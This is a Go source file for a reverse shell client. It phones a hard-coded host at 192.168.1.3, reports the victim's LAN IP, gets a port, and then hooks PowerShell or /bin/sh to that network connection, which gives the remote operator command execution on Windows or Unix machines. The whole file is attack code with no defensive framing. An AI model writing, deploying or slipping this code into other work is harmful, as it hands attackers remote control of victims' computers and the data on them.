package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os/exec"
	"runtime"
)

var HOST_IP string = "192.168.1.3"

func main() {
	connectPort := GetPort()
	if connectPort == "-1" {
		return
	}
	EstablishConnection(connectPort)
}

func GetPort() string {
	//Get the reverse shell port from the server
	getPort, err := net.Dial("tcp", HOST_IP+":8003")
	if err != nil {
		fmt.Println("Couldn't get connection")
		return "-1"
	}
	defer getPort.Close()
	// ip := GetOutboundIP()
	it, err := getPort.Write([]byte("INFO:{clientType:Basic Reverse Shell,lanIP:" + GetOutboundIP() + ",isEncoded:false}\n"))
	if err != nil {
		fmt.Println(err.Error())
		fmt.Println(it)
	}
	port, _ := bufio.NewReader(getPort).ReadString('\n')
	return port
}

func GetOutboundIP() string {
	//Dial a connection to a WAN IP to get the box's correct IP address.
	//Note that this doesn't actually establish a connection,
	//but simply pretends to setup one. This is enough to get us the IP
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "none"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	ip := localAddr.IP
	ipstr := ip.String()
	return ipstr
}

func EstablishConnection(port string) {
	//Establish reverse connection to host
	con, _ := net.Dial("tcp", HOST_IP+":"+port)
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}
	//Set input/output to the established connection's in/out
	cmd.Stdin = con
	test := bufio.NewWriter(con)
	out, _ := cmd.Output()
	test.Write(out)
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
}

/**
Base 64 encode a message to be sent to the server
*/
func b64_encode(text string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(text))
	return encoded
}

/**
base 64 decode a message from the server
*/
func b64_decode(text string) string {
	decoded, err := base64.StdEncoding.DecodeString(text)
	if err != nil {
		fmt.Println(err)
	}
	return string(decoded)
}
